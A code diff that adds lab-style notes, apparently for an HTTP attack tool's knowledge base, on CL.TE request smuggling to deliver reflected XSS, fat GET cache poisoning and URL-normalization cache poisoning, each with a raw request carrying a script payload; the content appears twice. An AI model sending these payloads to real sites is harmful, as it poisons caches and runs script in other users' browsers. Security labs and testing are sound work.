@@ -739,6 +739,44 @@ X-Ignore: x
 \`\`\`
 Front-end forwards 50 bytes (both requests). Back-end ignores CL on \`/resources/\`, reads zero bytes as body, and treats the remainder as a new request → smuggled admin action executes.
 Detection: find paths where back-end ignores CL (static dirs, health checks), then smuggle after them.
+
+## Lab: CL.TE Smuggling to Deliver Reflected XSS (PortSwigger)
+CL.TE smuggling can deliver reflected XSS to other users without them clicking a malicious link:
+\`\`\`
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0\\r\\n
+\\r\\n
+GET /post?postId=5 HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+\`\`\`
+The smuggled request includes an XSS payload in the User-Agent header. When the next user's request is processed, it gets prepended with the smuggled request — the server reflects the User-Agent value in the response, delivering XSS to the victim. This turns a reflected XSS into a stored-like attack because the victim never clicks a malicious link.
+
+## Web Cache Poisoning via Fat GET (PortSwigger)
+Fat GET attacks exploit servers that process both URL parameters and request bodies on GET requests:
+\`\`\`
+GET /?param=innocent HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+param=<script>alert(1)</script>
+\`\`\`
+The cache keys on the URL parameter (\`param=innocent\`), but the origin server uses the body parameter value (\`param=<script>...\`). The poisoned response is cached under the innocent URL and served to all subsequent visitors. Detection: send GET with both URL and body params — if the response reflects the body param, fat GET is viable.
+
+## Web Cache Poisoning via URL Normalization (PortSwigger)
+Exploits a normalization discrepancy between the cache and the origin for path-based reflected XSS:
+\`\`\`
+GET /random-path<script>alert(1)</script> HTTP/1.1
+Host: target.com
+\`\`\`
+The origin server reflects the full path in its 404 error page (path-based XSS). The cache normalizes (URL-decodes/canonicalizes) the path before keying, so the poisoned response is stored under the normalized path. Subsequent users requesting the clean URL receive the cached XSS response. **Raw sockets are required** because browsers and HTTP libraries URL-encode the angle brackets — use \`raw_http_send\` with exact byte control to send unencoded \`<script>\` tags in the path.
 `
       }]
     })
@@ -2600,6 +2638,44 @@ Trigger a browser to desync its own connection to a vulnerable server:
 
 ## Pause-Based Smuggling
 Send the request headers and partial body, then pause for longer than the front-end timeout but shorter than the back-end timeout. The front-end forwards what it has; the remaining bytes are treated as a new request by the back-end.
+
+## Smuggling to Deliver Reflected XSS
+CL.TE smuggling can weaponize reflected XSS without victim interaction:
+\`\`\`
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0\\r\\n
+\\r\\n
+GET /post?postId=5 HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+\`\`\`
+Smuggled request with XSS in User-Agent is prepended to the next user's request. Server reflects User-Agent in response, delivering XSS to victim. Turns reflected XSS into a stored-like attack — no malicious link needed.
+
+## Web Cache Poisoning
+
+### Fat GET
+\`\`\`
+GET /?param=innocent HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+param=<script>alert(1)</script>
+\`\`\`
+Cache keys on URL parameter (\`param=innocent\`), origin uses body parameter. Poisoned response cached under clean URL. Detect: send GET with both URL and body params — if response reflects body param, fat GET works.
+
+### URL Path Normalization
+\`\`\`
+GET /random<script>alert(1)</script> HTTP/1.1
+Host: target.com
+\`\`\`
+Origin reflects full path in 404 page (path-based XSS). Cache normalizes/decodes the path before keying — poisoned response stored under clean URL. **Raw sockets required** — browsers URL-encode angle brackets. Use \`raw_http_send\` for unencoded \`<script>\` in path.
 
 ## Tool Reference
 - \`raw_http_send\`: Send raw HTTP/1.1 requests with exact byte control for CL.TE/TE.CL
